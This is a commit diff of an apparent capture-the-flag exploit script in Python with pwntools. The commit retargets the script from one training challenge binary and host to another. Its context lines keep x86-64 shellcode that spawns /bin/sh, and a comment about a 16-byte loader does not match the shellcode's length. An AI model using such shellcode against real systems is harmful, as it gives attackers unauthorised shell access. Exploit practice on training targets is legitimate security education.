709867d531251d31f0ccb392bb2c44cc23994b49
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-10-01 19:58:23 +0200

    Update e.py

--- c8/e.py
+++ c8/e.py
@@ -6,11 +6,11 @@ COMMANDS = """
 shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
 
 if args.GDB:
-    p = gdb.debug("./open_what_write", gdbscript=COMMANDS)
+    p = gdb.debug("./forking_server", gdbscript=COMMANDS)
 elif args.REMOTE:
-    p = remote("open-what-write.training.offensivedefensive.it", 8080, ssl=True)
+    p = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
 else:
-    p = process("./open_what_write")
+    p = process("./forking_server")
 
 # Send first stage loader (exactly 16 bytes)
 p.send(shellcode)
